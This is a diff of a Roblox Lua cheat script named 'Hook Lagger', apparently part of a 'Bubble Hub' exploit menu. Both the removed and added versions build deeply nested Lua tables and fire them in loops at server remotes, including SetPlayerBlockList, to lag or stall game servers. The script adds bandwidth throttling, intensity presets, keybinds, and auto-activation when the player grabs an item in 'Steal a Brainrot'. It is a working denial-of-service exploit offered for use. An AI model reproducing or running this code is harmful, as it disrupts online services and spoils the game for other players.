-    s.ApplyStrokeMode = mode or Enum.ApplyStrokeMode.Border
-    s.Parent = o
-    return s
-end
-
-local function makeDraggable(handle, target)
-    local dragging, dragStart, startPos
-    handle.InputBegan:Connect(function(input)
-        if locked then return end
-        if input.UserInputType == Enum.UserInputType.MouseButton1
-        or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = target.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
-            end)
-        end
-    end)
-    UserInputService.InputChanged:Connect(function(input)
-        if not dragging or locked then return end
-        if input.UserInputType == Enum.UserInputType.MouseMovement
-        or input.UserInputType == Enum.UserInputType.Touch then
-            local d = input.Position - dragStart
-            target.Position = UDim2.new(
-                startPos.X.Scale, startPos.X.Offset + d.X,
-                startPos.Y.Scale, startPos.Y.Offset + d.Y
-            )
-        end
+local function firePayload(depth)
+    if CachedPayloadDepth ~= depth or not CachedPayload then
+        CachedPayloadDepth = depth
+        CachedPayload = buildPayload(depth)
+    end
+    pcall(function()
+        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(CachedPayload)
     end)
 end
 
--- ============================================================
--- LAGGER LOGIC
--- ============================================================
-local function getRemote(path)
-    if not path or path == "" then return nil end
-    local obj = game
-    local clean = path:gsub("^game%.", "")
-    for piece in clean:gmatch("[^%.]+") do
-        if obj then
-            obj = obj[piece]
-        else
-            return nil
-        end
-    end
-    return obj
-end
-
-local function doSpam(inc, attempts)
-    local mainTable = {}
-    local spamTable = {}
-    table.insert(spamTable, {})
-    local ptr = spamTable[1]
-    for i = 1, inc do
-        local newTable = {}
-        table.insert(ptr, newTable)
-        ptr = newTable
-    end
-    for i = 1, 15000 do
-        table.insert(mainTable, spamTable)
-        if i % 1000 == 0 then task.wait() end
-    end
-    local remoteObj = getRemote(remotePath)
-    if remoteObj then
-        for i = 1, attempts do
+local function startMain()
+    if LaggerThreads.Main then return end
+    LaggerState.Main = true
+    LaggerThreads.Main = task.spawn(function()
+        while LaggerState.Main do
             pcall(function()
-                if remoteObj:IsA("RemoteEvent") or remoteObj:IsA("UnreliableRemoteEvent") then
-                    remoteObj:FireServer(mainTable)
-                elseif remoteObj:IsA("RemoteFunction") then
-                    remoteObj:InvokeServer(mainTable)
-                end
+                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(LaggerConfig.MaxKBPS)
             end)
+            firePayload(LaggerConfig.TableIncrease)
+            task.wait(LaggerConfig.LoopWaitTime)
         end
-    end
-end
-
-local function runLoop()
-    while active do
-        task.spawn(function() doSpam(cfg.x, cfg.y) end)
-        task.wait(cfg.z)
-    end
-end
-
-local function flip(state)
-    active = state
-    -- wird nach GUI-Init gesetzt
-end
-
--- ============================================================
--- HOOK LAGGER PANEL
--- ============================================================
-local hook = Instance.new("Frame")
-hook.Name = "HookLagger"
-hook.Size = UDim2.fromOffset(230, 125)
-hook.Position = UDim2.fromOffset(130, 130)
-hook.BackgroundColor3 = C.bg
-hook.BackgroundTransparency = 0
-hook.BorderSizePixel = 0
-hook.Active = true
-hook.Parent = gui
-corner(hook, 8)
-
-stroke(hook, C.border, 2, 0)
-stroke(hook, C.titleGlow, 4, 0.75)
-
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -80, 0, 30)
-title.Position = UDim2.fromOffset(10, 4)
-title.BackgroundTransparency = 1
-title.Text = "Hook Lagger"
-title.Font = Enum.Font.GothamBlack
-title.TextSize = 22
-title.TextColor3 = C.titleRed
-title.TextStrokeColor3 = Color3.fromRGB(80, 0, 5)
-title.TextStrokeTransparency = 0.15
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.Parent = hook
-
-local titleGrad = Instance.new("UIGradient")
-titleGrad.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 70, 80)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(245, 30, 40)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(190, 15, 25)),
-})
-titleGrad.Rotation = 90
-titleGrad.Parent = title
-
-makeDraggable(title, hook)
-
--- Status label (rechts oben im Panel)
-local statusLbl = Instance.new("TextLabel")
-statusLbl.Size = UDim2.fromOffset(50, 20)
-statusLbl.Position = UDim2.new(1, -54, 0, 8)
-statusLbl.BackgroundTransparency = 1
-statusLbl.Text = "OFF"
-statusLbl.Font = Enum.Font.GothamBold
-statusLbl.TextSize = 11
-statusLbl.TextColor3 = C.statusOff
-statusLbl.TextXAlignment = Enum.TextXAlignment.Right
-statusLbl.ZIndex = 5
-statusLbl.Parent = hook
-
--- ============================================================
--- BUTTONS (außerhalb links)
--- ============================================================
-local cogBtn = Instance.new("TextButton")
-cogBtn.Size = UDim2.fromOffset(26, 26)
-cogBtn.Position = UDim2.fromOffset(-62, 0)
-cogBtn.BackgroundColor3 = C.btnInactive
-cogBtn.BorderSizePixel = 0
-cogBtn.Text = "⚙"
-cogBtn.Font = Enum.Font.GothamBold
-cogBtn.TextSize = 14
-cogBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-cogBtn.AutoButtonColor = false
-cogBtn.ZIndex = 5
-cogBtn.Parent = hook
-corner(cogBtn, 5)
-stroke(cogBtn, C.borderGlow, 1.2, 0.3)
-
-local lockBtn = Instance.new("TextButton")
-lockBtn.Size = UDim2.fromOffset(26, 26)
-lockBtn.Position = UDim2.fromOffset(-32, 0)
-lockBtn.BackgroundColor3 = C.lockOff
-lockBtn.BorderSizePixel = 0
-lockBtn.Text = "🔓"
-lockBtn.Font = Enum.Font.GothamBold
-lockBtn.TextSize = 13
-lockBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-lockBtn.AutoButtonColor = false
-lockBtn.ZIndex = 5
-lockBtn.Parent = hook
-corner(lockBtn, 5)
-stroke(lockBtn, C.borderGlow, 1.2, 0.3)
-
--- ============================================================
--- ROWS
--- ============================================================
-local function makeRow(y, labelText)
-    local row = Instance.new("Frame")
-    row.Size = UDim2.new(1, -14, 0, 36)
-    row.Position = UDim2.fromOffset(7, y)
-    row.BackgroundColor3 = C.rowBg
-    row.BackgroundTransparency = 0
-    row.BorderSizePixel = 0
-    row.Parent = hook
-    corner(row, 5)
-    stroke(row, C.border, 1, 0.35)
-
-    local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, -80, 0, 14)
-    lbl.Position = UDim2.fromOffset(8, 3)
-    lbl.BackgroundTransparency = 1
-    lbl.Text = labelText
-    lbl.Font = Enum.Font.GothamMedium
-    lbl.TextSize = 10
-    lbl.TextColor3 = C.label
-    lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.Parent = row
-
-    return row, lbl
-end
-
-local function makeToggle(parent, posX, posY, initial, onChanged)
-    local track = Instance.new("Frame")
-    track.Size = UDim2.fromOffset(26, 14)
-    track.Position = UDim2.new(1, posX, 0, posY)
-    track.BackgroundColor3 = initial and C.trackOn or C.trackOff
-    track.BorderSizePixel = 0
-    track.Parent = parent
-    corner(track, 7)
-    stroke(track, C.borderGlow, 1, 0.5)
-
-    local knob = Instance.new("Frame")
-    knob.Size = UDim2.fromOffset(10, 10)
-    knob.Position = initial and UDim2.new(1, -12, 0.5, -5) or UDim2.new(0, 2, 0.5, -5)
-    knob.BackgroundColor3 = C.knob
-    knob.BorderSizePixel = 0
-    knob.Parent = track
-    corner(knob, 5)
-
-    local state = initial
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.fromScale(1, 1)
-    btn.BackgroundTransparency = 1
-    btn.Text = ""
-    btn.Parent = track
-    btn.MouseButton1Click:Connect(function()
-        state = not state
-        track.BackgroundColor3 = state and C.trackOn or C.trackOff
-        knob.Position = state and UDim2.new(1, -12, 0.5, -5) or UDim2.new(0, 2, 0.5, -5)
-        if onChanged then onChanged(state) end
     end)
-    return track, function(newState)
-        state = newState
-        track.BackgroundColor3 = state and C.trackOn or C.trackOff
-        knob.Position = state and UDim2.new(1, -12, 0.5, -5) or UDim2.new(0, 2, 0.5, -5)
+end
+
+local function stopMain()
+    LaggerState.Main = false
+    if LaggerThreads.Main then
+        pcall(task.cancel, LaggerThreads.Main)
+        LaggerThreads.Main = nil
+    end
+    pcall(function()
+        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+    end)
+end
+
+local function startLowEnd()
+    if LaggerThreads.LowEnd then return end
+    LaggerState.LowEnd = true
+    LaggerThreads.LowEnd = task.spawn(function()
+        while LaggerState.LowEnd do
+            pcall(function()
+                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(LaggerConfig.LowEndMaxKBPS)
+            end)
+            firePayload(LaggerConfig.LowEndTableIncrease)
+            task.wait(LaggerConfig.LowEndLoopWaitTime)
+        end
+    end)
+end
+
+local function stopLowEnd()
+    LaggerState.LowEnd = false
+    if LaggerThreads.LowEnd then
+        pcall(task.cancel, LaggerThreads.LowEnd)
+        LaggerThreads.LowEnd = nil
+    end
+    pcall(function()
+        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+    end)
+end
+
+---------------------------------------------------------------------
+-- ============ Helpers UI ============
+---------------------------------------------------------------------
+
+local GREEN = Color3.fromRGB(239, 68, 68)
+local GREY  = Color3.fromRGB(55, 55, 68)
+
+local function setToggleVisual(track, knob, enabled, instant)
+    local targetPos   = enabled and UDim2.new(0, 25, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
+    local targetColor = enabled and GREEN or GREY
+    if instant then
+        knob.Position = targetPos
+        track.BackgroundColor3 = targetColor
+    else
+        TweenService:Create(knob, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Position = targetPos }):Play()
+        TweenService:Create(track, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { BackgroundColor3 = targetColor }):Play()
     end
 end
 
--- ============================================================
--- FLIP FUNCTION (jetzt mit GUI-Refs)
--- ============================================================
-function flip(state)
-    -- Wenn gewünscht "AUS = alles aus"
-    if not state then
-        active = false
-        statusLbl.Text = "OFF"
-        statusLbl.TextColor3 = C.statusOff
+local Keybinds = { PCLagger = nil, LowPower = nil }
+
+local function keyDisplay(k)
+    if not k then return "NONE" end
+    return tostring(k):gsub("Enum.KeyCode.", "")
+end
+
+local function listenForKey(btn, slot)
+    local oldText = btn.Text
+    btn.Text = "..."
+    btn.TextColor3 = Color3.fromRGB(255, 180, 180)
+
+    local conn
+    conn = UserInputService.InputBegan:Connect(function(input, gp)
+        if gp then return end
+        if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
+        if input.KeyCode == Enum.KeyCode.Unknown then return end
+        if input.KeyCode == Enum.KeyCode.Escape then
+            btn.Text = oldText
+            btn.TextColor3 = Color3.fromRGB(200, 200, 210)
+            conn:Disconnect()
+            return
+        end
+        Keybinds[slot] = input.KeyCode
+        btn.Text = keyDisplay(input.KeyCode)
+        btn.TextColor3 = Color3.fromRGB(200, 200, 210)
+        conn:Disconnect()
+    end)
+
+    task.delay(5, function()
+        if conn then
+            pcall(function() conn:Disconnect() end)
+            if btn.Text == "..." then
+                btn.Text = oldText
+                btn.TextColor3 = Color3.fromRGB(200, 200, 210)
+            end
+        end
+    end)
+end
+
+---------------------------------------------------------------------
+-- ============ WIRING PC LAGGER ============
+---------------------------------------------------------------------
+
+local function setPCLagger(state)
+    if state == LaggerState.Main then
+        setToggleVisual(Track, Knob, state, true)
         return
     end
-    if active then return end
-    active = true
-    statusLbl.Text = "ON"
-    statusLbl.TextColor3 = C.statusOn
-    task.spawn(runLoop)
+    if state and LaggerState.LowEnd then
+        stopLowEnd()
+        setToggleVisual(Track_2, Knob_2, false)
+    end
+    if state then
+        startMain()
+    else
+        stopMain()
+    end
+    setToggleVisual(Track, Knob, state)
 end
 
--- Row 1: PC Lagger → Haupt-Toggle
-local row1 = makeRow(38, "PC Lagger")
-
-local dd1 = Instance.new("TextButton")
-dd1.Size = UDim2.fromOffset(52, 16)
-dd1.Position = UDim2.new(1, -94, 0.5, -8)
-dd1.BackgroundColor3 = C.dropdown
-dd1.BorderSizePixel = 0
-dd1.Text = "V1"
-dd1.Font = Enum.Font.GothamBold
-dd1.TextSize = 10
-dd1.TextColor3 = C.label
-dd1.AutoButtonColor = false
-dd1.Parent = row1
-corner(dd1, 4)
-stroke(dd1, C.borderGlow, 1, 0.4)
-
-local dd1Arrow = Instance.new("TextLabel")
-dd1Arrow.Size = UDim2.fromOffset(12, 16)
-dd1Arrow.Position = UDim2.new(1, -14, 0, 0)
-dd1Arrow.BackgroundTransparency = 1
-dd1Arrow.Text = "▾"
-dd1Arrow.Font = Enum.Font.GothamBold
-dd1.TextSize = 10
-dd1Arrow.TextSize = 9
-dd1Arrow.TextColor3 = C.labelDim
-dd1Arrow.Parent = dd1
-
-local mainToggle
-mainToggle = makeToggle(row1, -32, 11, false, function(state)
-    flip(state)
+ToggleButton.MouseButton1Click:Connect(function()
+    setPCLagger(not LaggerState.Main)
 end)
 
--- Row 2: Low Power Lagger → Keybind
-local row2 = makeRow(78, "Low Power Lagger")
-
-local kbBtn = Instance.new("TextButton")
-kbBtn.Size = UDim2.fromOffset(90, 16)
-kbBtn.Position = UDim2.new(0.5, -45, 1, -18)
-kbBtn.BackgroundColor3 = C.dropdown
-kbBtn.BorderSizePixel = 0
-kbBtn.Text = hotkey.Name
-kbBtn.Font = Enum.Font.GothamBold
-kbBtn.TextSize = 10
-kbBtn.TextColor3 = C.label
-kbBtn.AutoButtonColor = false
-kbBtn.Parent = row2
-corner(kbBtn, 4)
-stroke(kbBtn, C.borderGlow, 1, 0.4)
-
-local waitingForKey = false
-kbBtn.MouseButton1Click:Connect(function()
-    waitingForKey = true
-    kbBtn.Text = "..."
+KeybindButton.MouseButton1Click:Connect(function()
+    listenForKey(KeybindButton, "PCLagger")
 end)
 
--- ============================================================
--- SETTINGS PANEL
--- ============================================================
-local settings = Instance.new("Frame")
-settings.Name = "Settings"
-settings.Size = UDim2.fromOffset(185, 300)
-settings.Position = UDim2.fromOffset(400, 130)
-settings.BackgroundColor3 = C.bg
-settings.BackgroundTransparency = 0
-settings.BorderSizePixel = 0
-settings.Active = true
-settings.Visible = false
-settings.Parent = gui
-corner(settings, 8)
+---------------------------------------------------------------------
+-- ============ WIRING LOW POWER LAGGER ============
+---------------------------------------------------------------------
 
-stroke(settings, C.border, 2, 0)
-stroke(settings, C.titleGlow, 4, 0.75)
-
-local setHeader = Instance.new("Frame")
-setHeader.Size = UDim2.new(1, 0, 0, 26)
-setHeader.BackgroundTransparency = 1
-setHeader.Parent = settings
-
-local setTitle = Instance.new("TextLabel")
-setTitle.Size = UDim2.new(1, -36, 1, 0)
-setTitle.Position = UDim2.fromOffset(10, 0)
-setTitle.BackgroundTransparency = 1
-setTitle.Text = "SETTINGS"
-setTitle.Font = Enum.Font.GothamBlack
-setTitle.TextSize = 11
-setTitle.TextColor3 = C.label
-setTitle.TextXAlignment = Enum.TextXAlignment.Left
-setTitle.Parent = setHeader
-
-makeDraggable(setHeader, settings)
-
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.fromOffset(18, 18)
-closeBtn.Position = UDim2.new(1, -24, 0.5, -9)
-closeBtn.BackgroundColor3 = C.btnInactive
-closeBtn.BorderSizePixel = 0
-closeBtn.Text = "X"
-closeBtn.Font = Enum.Font.GothamBold
-closeBtn.TextSize = 9
-closeBtn.TextColor3 = C.label
-closeBtn.AutoButtonColor = false
-closeBtn.Parent = setHeader
-corner(closeBtn, 4)
-stroke(closeBtn, C.borderGlow, 1, 0.3)
-
-local function makeSection(parent, y, text)
-    local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, -20, 0, 11)
-    lbl.Position = UDim2.fromOffset(10, y)
-    lbl.BackgroundTransparency = 1
-    lbl.Text = text
-    lbl.Font = Enum.Font.GothamBold
-    lbl.TextSize = 8
-    lbl.TextColor3 = C.labelDim
-    lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.Parent = parent
-    return lbl
+local function setLowPower(state)
+    if state == LaggerState.LowEnd then
+        setToggleVisual(Track_2, Knob_2, state, true)
+        return
+    end
+    if state and LaggerState.Main then
+        stopMain()
+        setToggleVisual(Track, Knob, false)
+    end
+    if state then
+        startLowEnd()
+    else
+        stopLowEnd()
+    end
+    setToggleVisual(Track_2, Knob_2, state)
 end
 
--- Option Pair mit Callback
-local function makeOptionPair(parent, y, opt1, opt2, activeIdx, onSelect)
-    local row = Instance.new("Frame")
-    row.Size = UDim2.new(1, -20, 0, 20)
-    row.Position = UDim2.fromOffset(10, y)
-    row.BackgroundTransparency = 1
-    row.Parent = parent
-
-    local function makeOptBtn(text, xScale, isActive)
-        local b = Instance.new("TextButton")
-        b.Size = UDim2.new(0.5, -2, 1, 0)
-        b.Position = UDim2.new(xScale, xScale == 0 and 0 or 2, 0, 0)
-        b.BackgroundColor3 = isActive and C.btnActive or C.btnInactive
-        b.BorderSizePixel = 0
-        b.Text = text
-        b.Font = Enum.Font.GothamBold
-        b.TextSize = 9
-        b.TextColor3 = Color3.fromRGB(255, 255, 255)
-        b.AutoButtonColor = false
-        b.Parent = row
-        corner(b, 4)
-        stroke(b, C.borderGlow, 1, 0.35)
-        return b
-    end
-
-    local b1 = makeOptBtn(opt1, 0, activeIdx == 1)
-    local b2 = makeOptBtn(opt2, 0.5, activeIdx == 2)
-
-    local function select(idx)
-        b1.BackgroundColor3 = idx == 1 and C.btnActive or C.btnInactive
-        b2.BackgroundColor3 = idx == 2 and C.btnActive or C.btnInactive
-        if onSelect then onSelect(idx) end
-    end
-
-    b1.MouseButton1Click:Connect(function() select(1) end)
-    b2.MouseButton1Click:Connect(function() select(2) end)
-    return b1, b2, select
-end
-
-local function makeTriple(parent, y, opts, activeIdx, onSelect)
-    local row = Instance.new("Frame")
-    row.Size = UDim2.new(1, -20, 0, 18)
-    row.Position = UDim2.fromOffset(10, y)
-    row.BackgroundTransparency = 1
-    row.Parent = parent
-
-    local btns = {}
-    for i, text in ipairs(opts) do
-        local b = Instance.new("TextButton")
-        b.Size = UDim2.new(1/3, -2, 1, 0)
-        b.Position = UDim2.new((i-1)/3, (i-1 == 0 and 0 or 2), 0, 0)
-        b.BackgroundColor3 = (i == activeIdx) and C.btnActive or C.btnInactive
-        b.BorderSizePixel = 0
-        b.Text = text
-        b.Font = Enum.Font.GothamBold
-        b.TextSize = 8
-        b.TextColor3 = Color3.fromRGB(255, 255, 255)
-        b.AutoButtonColor = false
-        b.Parent = row
-        corner(b, 4)
-        stroke(b, C.borderGlow, 1, 0.35)
-        btns[i] = b
-    end
-
-    for i, b in ipairs(btns) do
-        b.MouseButton1Click:Connect(function()
-            for j, other in ipairs(btns) do
-                other.BackgroundColor3 = (j == i) and C.btnActive or C.btnInactive
-            end
-            if onSelect then onSelect(opts[i], i) end
-        end)
-    end
-    return btns
-end
-
--- Sections
-makeSection(settings, 30, "PC LAGGER")
-makeOptionPair(settings, 43, "V1", "V2", 1)
-
-makeSection(settings, 71, "LOW POWER LAGGER")
-makeOptionPair(settings, 84, "V1", "V2", 1)
-makeTriple(settings, 108, {"Low", "Mid", "High"}, 2, function(mode)
-    if mode == "Low" then
-        cfg.x, cfg.y, cfg.z = 1.5, 1, 0.25
-    elseif mode == "Mid" then
-        cfg.x, cfg.y, cfg.z = 2.5, 1, 0.15
-    elseif mode == "High" then
-        cfg.x, cfg.y, cfg.z = 4, 2, 0.08
-    end
+ToggleButton_2.MouseButton1Click:Connect(function()
+    setLowPower(not LaggerState.LowEnd)
 end)
 
-makeSection(settings, 136, "TARGET MODE")
-makeOptionPair(settings, 149, "PC", "LOW", 2)
-
--- ENABLE ON GRAB (echte Funktion)
-makeSection(settings, 177, "ENABLE ON GRAB")
-makeOptionPair(settings, 190, "ON", "OFF", 2, function(idx)
-    auto.enableOnGrab = (idx == 1)  -- 1 = ON, 2 = OFF
+KeybindButton_2.MouseButton1Click:Connect(function()
+    listenForKey(KeybindButton_2, "LowPower")
 end)
 
--- DISABLE ON DROP (echte Funktion)
-makeSection(settings, 218, "DISABLE ON DROP")
-makeOptionPair(settings, 231, "ON", "OFF", 2, function(idx)
-    auto.disableOnDrop = (idx == 1)
-end)
+---------------------------------------------------------------------
+-- ============ KEYBINDS GLOBAUX ============
+---------------------------------------------------------------------
 
--- BROKEN EXECUTOR
-makeSection(settings, 259, "BROKEN EXECUTOR")
-makeOptionPair(settings, 272, "ON", "OFF", 2)
-
--- ============================================================
--- BRAINROT GRAB/DROP DETECTION
--- ============================================================
--- In Steal a Brainrot: WalkSpeed < 25 wenn brainrot gehalten wird
-local lastCarrying = false
-
-RunService.Heartbeat:Connect(function()
-    local char = LP.Character
-    if not char then return end
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    if not hum then return end
-
-    -- Detection: Brainrot wird gehalten wenn WalkSpeed < 25 ist
-    local carrying = hum.WalkSpeed < 25
-
-    if carrying ~= lastCarrying then
-        if carrying then
-            -- Brainrot AUFGEHOBEN → Lagger AN (wenn aktiviert)
-            if auto.enableOnGrab then
-                flip(true)
-            end
-        else
-            -- Brainrot GEDROPPT → Lagger AUS (wenn aktiviert)
-            if auto.disableOnDrop then
-                flip(false)
-            end
-        end
-        lastCarrying = carrying
-    end
-end)
-
--- ============================================================
--- BTN LOGIC
--- ============================================================
-local settingsOpen = false
-cogBtn.MouseButton1Click:Connect(function()
-    settingsOpen = not settingsOpen
-    settings.Visible = settingsOpen
-    TweenService:Create(cogBtn, TweenInfo.new(0.15), {
-        BackgroundColor3 = settingsOpen and C.btnActive or C.btnInactive,
-    }):Play()
-end)
-
-closeBtn.MouseButton1Click:Connect(function()
-    settingsOpen = false
-    settings.Visible = false
-    TweenService:Create(cogBtn, TweenInfo.new(0.15), {
-        BackgroundColor3 = C.btnInactive,
-    }):Play()
-end)
-
-lockBtn.MouseButton1Click:Connect(function()
-    locked = not locked
-    lockBtn.Text = locked and "🔒" or "🔓"
-    TweenService:Create(lockBtn, TweenInfo.new(0.15), {
-        BackgroundColor3 = locked and C.lockOn or C.lockOff,
-    }):Play()
-end)
-
--- ============================================================
--- KEYBIND LISTENER
--- ============================================================
 UserInputService.InputBegan:Connect(function(input, gp)
     if gp then return end
+    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
     if UserInputService:GetFocusedTextBox() then return end
 
-    if waitingForKey and input.UserInputType == Enum.UserInputType.Keyboard then
-        waitingForKey = false
-        hotkey = input.KeyCode
-        kbBtn.Text = hotkey.Name
-        return
+    if Keybinds.PCLagger and input.KeyCode == Keybinds.PCLagger then
+        setPCLagger(not LaggerState.Main)
+    elseif Keybinds.LowPower and input.KeyCode == Keybinds.LowPower then
+        setLowPower(not LaggerState.LowEnd)
     end
+end)
 
-    if input.KeyCode == hotkey then
-        flip(not active)
+---------------------------------------------------------------------
+-- ============ SETTINGS ============
+---------------------------------------------------------------------
+
+local function refreshVersionVisual()
+    local isV1 = LaggerConfig.TableIncrease == LaggerConfig.PowerPCV1
+    VersionV1.BackgroundColor3 = isV1 and Color3.fromRGB(239, 68, 68) or Color3.fromRGB(25, 25, 35)
+    VersionV2.BackgroundColor3 = (not isV1) and Color3.fromRGB(239, 68, 68) or Color3.fromRGB(25, 25, 35)
+end
+
+local function refreshIntensityVisual()
+    local v = LaggerConfig.LowEndTableIncrease
+    IntensityLow.BackgroundColor3  = (v == LaggerConfig.PowerLow)  and Color3.fromRGB(239, 68, 68) or Color3.fromRGB(25, 25, 35)
+    IntensityMid.BackgroundColor3  = (v == LaggerConfig.PowerMid)  and Color3.fromRGB(239, 68, 68) or Color3.fromRGB(25, 25, 35)
+    IntensityHigh.BackgroundColor3 = (v == LaggerConfig.PowerHigh) and Color3.fromRGB(239, 68, 68) or Color3.fromRGB(25, 25, 35)
+end
+
+VersionV1.MouseButton1Click:Connect(function()
+    LaggerConfig.TableIncrease = LaggerConfig.PowerPCV1
+    CachedPayload = nil
+    refreshVersionVisual()
+end)
+
+VersionV2.MouseButton1Click:Connect(function()
+    LaggerConfig.TableIncrease = LaggerConfig.PowerPCV2
+    CachedPayload = nil
+    refreshVersionVisual()
+end)
+
+IntensityLow.MouseButton1Click:Connect(function()
+    LaggerConfig.LowEndTableIncrease = LaggerConfig.PowerLow
+    CachedPayload = nil
+    refreshIntensityVisual()
+end)
+
+IntensityMid.MouseButton1Click:Connect(function()
+    LaggerConfig.LowEndTableIncrease = LaggerConfig.PowerMid
+    CachedPayload = nil
+    refreshIntensityVisual()
+end)
+
+IntensityHigh.MouseButton1Click:Connect(function()
+    LaggerConfig.LowEndTableIncrease = LaggerConfig.PowerHigh
+    CachedPayload = nil
+    refreshIntensityVisual()
+end)
+
+refreshVersionVisual()
+refreshIntensityVisual()
+
+---------------------------------------------------------------------
+-- ============ UI: Settings / Lock / Drag ============
+---------------------------------------------------------------------
+
+Settings.MouseButton1Click:Connect(function()
+    SettingsPanel.Visible = not SettingsPanel.Visible
+    -- Positionner le panel à droite du Main, aligné verticalement sur le header
+    SettingsPanel.Position = UDim2.new(
+        Main.Position.X.Scale,
+        Main.Position.X.Offset + Main.Size.X.Offset + 8,
+        Main.Position.Y.Scale,
+        Main.Position.Y.Offset
+    )
+end)
+
+CloseBtn.MouseButton1Click:Connect(function()
+    SettingsPanel.Visible = false
+end)
+
+local locked = false
+Lock.MouseButton1Click:Connect(function()
+    locked = not locked
+    Lock.Text = locked and "🔓" or "🔒"
+    Lock.TextColor3 = locked and Color3.fromRGB(239, 68, 68) or Color3.fromRGB(240, 240, 250)
+end)
+
+-- Drag de la fenêtre principale
+local dragging, dragInput, dragStart, startPos
+
+local function updateDrag(input)
+    local delta = input.Position - dragStart
+    Main.Position = UDim2.new(
+        startPos.X.Scale,
+        startPos.X.Offset + delta.X,
+        startPos.Y.Scale,
+        startPos.Y.Offset + delta.Y
+    )
+end
+
+Main.InputBegan:Connect(function(input)
+    if locked then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Main.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
     end
+end)
 
-    -- LeftCtrl versteckt das Panel
-    if input.KeyCode == Enum.KeyCode.LeftControl then
-        hook.Visible = not hook.Visible
-        if not hook.Visible then
-            settings.Visible = false
-            settingsOpen = false
+Main.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if not locked and dragging and input == dragInput then
+        updateDrag(input)
+    end
+end)
+
+-- Ajouter le hover aux deux petits boutons
+addHover(Settings)
+addHover(Lock)
+
+---------------------------------------------------------------------
+-- ============ EXPOSITION POUR BUBBLE HUB ============
+---------------------------------------------------------------------
+
+_G.BubbleLagger = {
+    IsEnabled = function() return LaggerState.Main end,
+    IsLowEndEnabled = function() return LaggerState.LowEnd end,
+    SetEnabled = function(state) setPCLagger(state == true) end,
+    SetLowEndEnabled = function(state) setLowPower(state == true) end,
+    Toggle = function() setPCLagger(not LaggerState.Main); return LaggerState.Main end,
+    ToggleLowEnd = function() setLowPower(not LaggerState.LowEnd); return LaggerState.LowEnd end,
+    Stop = function()
+        stopMain(); stopLowEnd()
+        setToggleVisual(Track, Knob, false, true)
+        setToggleVisual(Track_2, Knob_2, false, true)
+    end,
+    GetPower = function() return LaggerConfig.TableIncrease end,
+    SetPower = function(v)
+        LaggerConfig.TableIncrease = math.clamp(tonumber(v) or 270, 1, 500)
+        CachedPayload = nil
+        refreshVersionVisual()
+    end,
+    GetLowPower = function() return LaggerConfig.LowEndTableIncrease end,
+    SetLowPower = function(v)
+        LaggerConfig.LowEndTableIncrease = math.clamp(tonumber(v) or 265, 1, 500)
+        CachedPayload = nil
+        refreshIntensityVisual()
+    end,
+    SetVisible = function(state) HookLagger.Enabled = state ~= false end,
+    ResetPosition = function()
+        Main.Position = UDim2.new(0.5, 110, 0.5, -157)
+    end,
+}
+
+pcall(function()
+    for _, gui in ipairs(game:GetService("CoreGui"):GetChildren()) do
+        if gui.Name == "HookLagger" and gui ~= HookLagger then
+            gui:Destroy()
         end
     end
 end)
 
-print("[Hook Lagger] Loaded")
+HookLagger.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+return HookLagger
